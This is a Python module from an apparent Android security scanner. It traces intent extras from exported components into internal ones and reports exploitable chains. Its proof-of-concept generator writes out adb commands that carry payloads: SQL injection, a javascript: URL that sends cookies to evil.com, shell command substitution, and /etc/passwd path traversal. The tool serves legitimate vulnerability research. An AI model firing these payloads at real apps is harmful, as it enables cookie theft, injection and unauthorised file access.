"""
ICC (Inter-Component Communication) Cross-Component Taint Tracking.

Finds data flows that cross Android component boundaries:

    ExportedActivity
        → startActivity(intent.putExtra("url", getStringExtra("url")))
        → InternalActivity.onCreate
        → WebView.loadUrl(getStringExtra("url"))

Even though InternalActivity is not exported, it is reachable via ICC from the
exported component, so the chain is exploitable.
"""

import os
import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

from .taint_engine import TaintSink


# ---------------------------------------------------------------------------
# Data-classes
# ---------------------------------------------------------------------------

@dataclass
class ICCEdge:
    source_component: str       # FQN of the launching component
    target_component: str       # FQN of the target component (may be simple name)
    extra_keys: List[str]       # Intent extra keys that are forwarded
    launch_type: str            # "activity" | "service" | "broadcast"
    file_path: str
    line_number: int


@dataclass
class ICCChain:
    entry_point: str            # exported component FQN
    icc_target: str             # internal component reached via ICC
    extra_key: str              # the extra key that carries tainted data
    sink: TaintSink             # the sink in the internal component
    severity: str               # always "High" or "Critical"
    poc_commands: List[str]     # sequence of adb commands to exploit


# ---------------------------------------------------------------------------
# Regex helpers
# ---------------------------------------------------------------------------

# new Intent(this, TargetActivity.class)
_EXPLICIT_INTENT_RE = re.compile(
    r'new\s+Intent\s*\([^)]*,\s*([\w$]+)\.class\s*\)'
)

# new Intent(ACTION_STRING) or new Intent(context, X.class)
_ACTION_INTENT_RE = re.compile(
    r'new\s+Intent\s*\(\s*"([^"]+)"\s*\)'
)

# .putExtra("key", ...) calls on a local intent variable
_PUT_EXTRA_RE = re.compile(
    r'\.putExtra\s*\(\s*"([^"]+)"'
)

# startActivity / startService / sendBroadcast calls
_LAUNCH_RE = re.compile(
    r'(startActivity|startActivityForResult|startService|sendBroadcast|'
    r'sendOrderedBroadcast|startForegroundService)\s*\(',
    re.IGNORECASE,
)

# getIntent() / getStringExtra used in a method (indicates the component reads extras)
_READ_EXTRA_RE = re.compile(
    r'(?:getIntent\(\)\s*\.)?\s*get\w*Extra\s*\(\s*"([^"]+)"'
)

# Method declaration pattern (lightweight)
_METHOD_DECL_RE = re.compile(
    r'(?:public|private|protected|static|final|synchronized|override)\s+'
    r'(?:[\w<>\[\],\s]+\s+)?(\w+)\s*\('
)

_SKIP_KEYWORDS: frozenset = frozenset({
    "if", "while", "for", "catch", "new", "return", "switch",
    "else", "do", "throw", "assert",
})


# ---------------------------------------------------------------------------
# ICCGraph
# ---------------------------------------------------------------------------

class ICCGraph:
    """
    Builds an inter-component communication graph from decompiled Java source.

    Combines the ICC edge information with taint sink data to identify
    exploitable multi-component chains where tainted data from an exported
    entry-point reaches a dangerous sink inside an otherwise internal component.
    """

    def __init__(self, decompiled_root: str, components: dict):
        """
        Args:
            decompiled_root: Path to Jadx output (parent of 'sources/').
            components: Dict mapping class FQN -> ComponentInfo (or dict).
                        Must include a '_package' key with the app's package name.
        """
        self.decompiled_root = decompiled_root
        self.components = components
        self._package: str = components.get("_package", "")
        self._sources_dir: str = self._resolve_sources_dir()

        # Populated by build()
        self._icc_edges: List[ICCEdge] = []

        # class_simple -> fqn mapping built during scan
        self._fqn_map: Dict[str, str] = {}

        # component fqn -> (comp_type, is_exported)
        self._comp_info: Dict[str, Tuple[str, bool]] = {}
        self._build_comp_info()

        # fqn -> set of extra keys the component reads from its intent
        self._component_reads: Dict[str, Set[str]] = {}

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _resolve_sources_dir(self) -> str:
        for sub in ("sources", "src", ""):
            candidate = os.path.join(self.decompiled_root, sub) if sub else self.decompiled_root
            if os.path.isdir(candidate):
                return candidate
        return self.decompiled_root

    def _build_comp_info(self):
        """Populate _comp_info from the components dict.

        Supports both flat dicts (name -> ComponentInfo) and nested dicts
        with a 'components' key (as produced by ReachabilityAnalyzer).
        """
        # Unwrap nested structure: {"_package": ..., "components": {...}}
        raw = self.components
        if "components" in raw and isinstance(raw["components"], dict):
            raw = raw["components"]

        for name, info in raw.items():
            if name.startswith("_"):
                continue
            if hasattr(info, "component_type"):
                self._comp_info[name] = (info.component_type, info.exported)
            elif isinstance(info, dict):
                self._comp_info[name] = (
                    info.get("component_type", "activity"),
                    info.get("exported", False),
                )
            else:
                continue
            simple = name.split(".")[-1]
            self._comp_info.setdefault(simple, self._comp_info[name])

    def _iter_java_files(self):
        for root, _, files in os.walk(self._sources_dir):
            for fname in files:
                if fname.endswith(".java"):
                    yield os.path.join(root, fname)

    def _read_file(self, path: str) -> Optional[str]:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                return fh.read()
        except OSError:
            return None

    def _extract_package(self, content: str) -> str:
        m = re.search(r'^\s*package\s+([\w.]+)\s*;', content, re.MULTILINE)
        return m.group(1) if m else ""

    def _extract_class_name(self, content: str, file_path: str) -> str:
        m = re.search(
            r'(?:public\s+)?(?:abstract\s+)?(?:final\s+)?class\s+(\w+)',
            content,
        )
        if m:
            return m.group(1)
        return os.path.splitext(os.path.basename(file_path))[0]

    def _extract_imports(self, content: str) -> Dict[str, str]:
        result: Dict[str, str] = {}
        for m in re.finditer(r'^\s*import\s+([\w.]+)\s*;', content, re.MULTILINE):
            fqn = m.group(1)
            result[fqn.split(".")[-1]] = fqn
        return result

    def _resolve_class(self, simple_name: str, imports: Dict[str, str]) -> str:
        """Resolve a simple class name to FQN using imports or best guess."""
        if simple_name in imports:
            return imports[simple_name]
        if simple_name in self._fqn_map:
            return self._fqn_map[simple_name]
        if self._package:
            return f"{self._package}.{simple_name}"
        return simple_name

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def build(self) -> "ICCGraph":
        """Scan all Java files and build the ICC edge list."""
        # First pass: build FQN map and collect which extras each component reads
        for java_file in self._iter_java_files():
            content = self._read_file(java_file)
            if not content:
                continue
            pkg = self._extract_package(content)
            cls = self._extract_class_name(content, java_file)
            fqn = f"{pkg}.{cls}" if pkg else cls
            self._fqn_map[cls] = fqn

            # Collect extra keys this component reads
            reads: Set[str] = set()
            for m in _READ_EXTRA_RE.finditer(content):
                reads.add(m.group(1))
            if reads:
                self._component_reads[fqn] = reads

        # Second pass: find ICC launch sites
        self._icc_edges = self._find_component_launches()
        return self

    def _find_component_launches(self) -> List[ICCEdge]:
        """
        Scan every .java file for startActivity / startService / sendBroadcast
        calls and capture the target component and any extras being passed.
        """
        edges: List[ICCEdge] = []

        for java_file in self._iter_java_files():
            content = self._read_file(java_file)
            if not content:
                continue

            pkg = self._extract_package(content)
            cls = self._extract_class_name(content, java_file)
            source_fqn = f"{pkg}.{cls}" if pkg else cls
            imports = self._extract_imports(content)

            lines = content.splitlines()
            current_method = "unknown"

            # We operate line-by-line; for multi-line launch statements we use
            # a sliding window of the surrounding context.
            window_size = 12  # lines to look ahead for putExtra calls

            for line_no, line in enumerate(lines, start=1):
                md = _METHOD_DECL_RE.search(line)
                if md and md.group(1) not in _SKIP_KEYWORDS:
                    current_method = md.group(1)

                launch_match = _LAUNCH_RE.search(line)
                if not launch_match:
                    continue

                launch_api = launch_match.group(1).lower()
                if "activity" in launch_api or "activityforresult" in launch_api:
                    launch_type = "activity"
                elif "service" in launch_api:
                    launch_type = "service"
                else:
                    launch_type = "broadcast"

                # Collect the surrounding block (some lines before + after)
                block_start = max(0, line_no - 1 - window_size)
                block_end = min(len(lines), line_no - 1 + window_size)
                block = "\n".join(lines[block_start:block_end])

                # Find target component
                target = self._resolve_target_component(block, pkg)
                if not target:
                    continue

                # Collect extras being passed in this launch block
                extra_keys: List[str] = []
                for em in _PUT_EXTRA_RE.finditer(block):
                    extra_keys.append(em.group(1))

                edges.append(ICCEdge(
                    source_component=source_fqn,
                    target_component=target,
                    extra_keys=list(dict.fromkeys(extra_keys)),  # dedupe, preserve order
                    launch_type=launch_type,
                    file_path=java_file,
                    line_number=line_no,
                ))

        return edges

    def _resolve_target_component(self, intent_expr: str, current_package: str) -> Optional[str]:
        """
        Attempt to resolve the target component class name from a code block
        that contains an Intent construction and a launch call.

        Handles:
          new Intent(this, VideoActivity.class)
          new Intent(context, com.example.VideoActivity.class)
          setClass(this, VideoActivity.class)
          setComponent(new ComponentName(pkg, "com.example.VideoActivity"))
        """
        # new Intent(ctx, ClassName.class)
        m = _EXPLICIT_INTENT_RE.search(intent_expr)
        if m:
            simple = m.group(1)
            return self._fqn_map.get(simple, f"{current_package}.{simple}" if current_package else simple)

        # setClass / setComponent
        set_class_re = re.compile(r'setClass\s*\([^,]+,\s*([\w$]+)\.class\s*\)')
        m = set_class_re.search(intent_expr)
        if m:
            simple = m.group(1)
            return self._fqn_map.get(simple, f"{current_package}.{simple}" if current_package else simple)

        # ComponentName("pkg", "fqn")
        comp_name_re = re.compile(
            r'ComponentName\s*\(\s*["\']([^"\']+)["\']\s*,\s*["\']([^"\']+)["\']\s*\)'
        )
        m = comp_name_re.search(intent_expr)
        if m:
            return m.group(2)

        # ComponentName(ctx, ClassName.class)
        comp_name_cls_re = re.compile(
            r'ComponentName\s*\([^,]+,\s*([\w$]+)\.class\s*\)'
        )
        m = comp_name_cls_re.search(intent_expr)
        if m:
            simple = m.group(1)
            return self._fqn_map.get(simple, f"{current_package}.{simple}" if current_package else simple)

        return None

    # ------------------------------------------------------------------
    # Exploitable chain detection
    # ------------------------------------------------------------------

    def get_exploitable_chains(self, taint_flows: List) -> List[ICCChain]:
        """
        Find ICC chains of the form:
            exported_component  -[ICC with extras]->  internal_component
                                                           |
                                                    [taint reaches sink]

        These are high-value because the internal component is only reachable
        via the exported one, making the whole chain exploitable from outside.

        Args:
            taint_flows: List[TaintFlow] from TaintEngine.analyze().

        Returns:
            List of ICCChain, sorted by severity (Critical first).
        """
        chains: List[ICCChain] = []

        # Index taint flows by the component+method containing the sink
        # Key: sink_class (fqn)
        from .taint_engine import TaintFlow  # local import to avoid circular
        sink_by_class: Dict[str, List] = {}
        for flow in taint_flows:
            sink_by_class.setdefault(flow.sink.sink_class, []).append(flow)

        for edge in self._icc_edges:
            source = edge.source_component
            target = edge.target_component

            # Source must be exported
            source_info = self._comp_info.get(source) or self._comp_info.get(
                source.split(".")[-1]
            )
            if not source_info or not source_info[1]:
                continue  # source not exported

            # Target must NOT be exported (internal, reachable only via ICC)
            target_info = self._comp_info.get(target) or self._comp_info.get(
                target.split(".")[-1]
            )
            if target_info and target_info[1]:
                continue  # target is already exported – not an escalation chain

            # Find taint flows that originate inside the target component
            flows_in_target = sink_by_class.get(target, [])

            # Also check if the target reads any of the extras the source sends
            target_reads = self._component_reads.get(target, set())
            forwarded_keys = set(edge.extra_keys) & target_reads

            # Even if we have no direct taint flow, if the target reads the same
            # extra key that source forwards, flag it as a potential chain
            relevant_flows = [
                f for f in flows_in_target
                if not forwarded_keys  # no extra-key info; include all
                or f.source.extra_name in forwarded_keys
                or not f.source.extra_name
            ]

            if not relevant_flows and not forwarded_keys:
                continue

            if relevant_flows:
                for flow in relevant_flows:
                    extra_key = flow.source.extra_name or (
                        next(iter(forwarded_keys), edge.extra_keys[0] if edge.extra_keys else "")
                    )
                    severity = "Critical" if flow.sink.sink_type in ("sql", "webview", "exec") else "High"
                    chains.append(ICCChain(
                        entry_point=source,
                        icc_target=target,
                        extra_key=extra_key,
                        sink=flow.sink,
                        severity=severity,
                        poc_commands=self._build_poc_commands(
                            source, target, extra_key, flow.sink, edge
                        ),
                    ))
            else:
                # Forwarded key exists but no confirmed taint flow – still report
                # as a potential ICC chain (lower confidence)
                for key in sorted(forwarded_keys):
                    chains.append(ICCChain(
                        entry_point=source,
                        icc_target=target,
                        extra_key=key,
                        sink=TaintSink(
                            sink_class=target,
                            sink_method="unknown",
                            sink_api="(potential – forwarded extra)",
                            sink_type="intent",
                            severity="High",
                            file_path=edge.file_path,
                            line_number=edge.line_number,
                            code_snippet="",
                        ),
                        severity="High",
                        poc_commands=self._build_poc_commands(
                            source, target, key, None, edge
                        ),
                    ))

        # Deduplicate by (entry_point, icc_target, extra_key, sink_api)
        seen: Set[Tuple] = set()
        unique: List[ICCChain] = []
        for ch in chains:
            dedup_key = (ch.entry_point, ch.icc_target, ch.extra_key, ch.sink.sink_api)
            if dedup_key not in seen:
                seen.add(dedup_key)
                unique.append(ch)

        # Sort: Critical first, then High
        unique.sort(key=lambda c: (0 if c.severity == "Critical" else 1))
        return unique

    # ------------------------------------------------------------------
    # PoC generation
    # ------------------------------------------------------------------

    def _build_poc_commands(
        self,
        source_fqn: str,
        target_fqn: str,
        extra_key: str,
        sink: Optional[TaintSink],
        edge: ICCEdge,
    ) -> List[str]:
        """
        Build a sequence of adb commands that demonstrate the ICC chain.

        Step 1: Trigger the exported source component with a malicious payload.
        Step 2: (Informational) The source will forward an Intent to the target.
        """
        pkg = self._package
        commands: List[str] = []

        # Determine payload based on sink type
        if sink is None:
            payload = "attacker_value"
            sink_type = "intent"
        else:
            sink_type = sink.sink_type
            if sink_type == "sql":
                payload = "' OR '1'='1"
            elif sink_type == "webview":
                payload = "javascript:fetch('https://evil.com/?c='+document.cookie)"
            elif sink_type == "exec":
                payload = "$(id > /data/data/pwned.txt)"
            elif sink_type == "file":
                payload = "../../../../../../etc/passwd"
            else:
                payload = "https://attacker.com/phish"

        extra_flag = f'--es "{extra_key}" "{payload}"'

        # Build the source component selector
        src_simple = source_fqn.split(".")[-1]
        if pkg and source_fqn.startswith(pkg):
            src_selector = f"{pkg}/.{src_simple}"
        elif pkg:
            src_selector = f"{pkg}/{source_fqn}"
        else:
            src_selector = source_fqn

        src_type = (
            self._comp_info.get(source_fqn, ("activity", True))[0]
            or self._comp_info.get(src_simple, ("activity", True))[0]
        )

        if src_type == "activity":
            step1 = f"adb shell am start -n {src_selector} {extra_flag}"
        elif src_type == "service":
            step1 = f"adb shell am startservice -n {src_selector} {extra_flag}"
        else:
            step1 = f"adb shell am broadcast -n {src_selector} {extra_flag}"

        commands.append(
            f"# Step 1: Trigger exported component '{src_simple}' with malicious "
            f"payload in extra '{extra_key}'"
        )
        commands.append(step1)

        # Informational step 2
        tgt_simple = target_fqn.split(".")[-1]
        commands.append(
            f"# Step 2: '{src_simple}' will forward the Intent to internal "
            f"component '{tgt_simple}' which passes '{extra_key}' to {sink.sink_api if sink else 'a dangerous API'}"
        )

        if sink and sink.sink_type == "sql":
            commands.append(
                f"# Expected result: SQL injection executed in '{tgt_simple}' "
                f"via {sink.sink_api}"
            )
        elif sink and sink.sink_type == "webview":
            commands.append(
                f"# Expected result: JavaScript executes in '{tgt_simple}' "
                f"WebView – attacker can steal cookies/tokens"
            )
        elif sink and sink.sink_type == "exec":
            commands.append(
                f"# Expected result: OS command executed in '{tgt_simple}'"
            )

        return commands

    # ------------------------------------------------------------------
    # Accessors
    # ------------------------------------------------------------------

    @property
    def edges(self) -> List[ICCEdge]:
        """All ICC edges found during build()."""
        return list(self._icc_edges)

    def get_edges_from(self, component_fqn: str) -> List[ICCEdge]:
        """Return all ICC edges originating from the given component."""
        return [e for e in self._icc_edges if e.source_component == component_fqn]

    def get_edges_to(self, component_fqn: str) -> List[ICCEdge]:
        """Return all ICC edges targeting the given component."""
        return [e for e in self._icc_edges if e.target_component == component_fqn]
